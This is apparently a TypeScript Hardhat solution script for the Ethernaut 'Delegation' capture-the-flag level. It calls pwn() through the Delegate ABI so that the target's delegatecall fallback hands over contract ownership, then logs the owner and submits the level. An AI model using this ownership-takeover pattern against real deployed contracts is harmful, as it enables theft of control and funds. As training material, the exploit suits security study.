import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Delegate, Delegate__factory } from '../typechain-types'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'

const levelAddress = '0x9451961b7Aea1Df57bc20CC68D72f662241b5493'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = await loadOrCreateLevelInstance('Delegation', levelAddress, signer)

  console.log('Owner: ', await targetContract.owner())

  const provider = ethers.getDefaultProvider()
  const abi = ['function pwn()']
  const contract = new ethers.Contract(targetContract.address, Delegate__factory.abi, signer as any)

  const tx = await contract.pwn({ gasLimit: 100000 })
  console.log('PWN id: ', tx.hash)
  await tx.wait()

  console.log('Owner: ', await targetContract.owner())

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
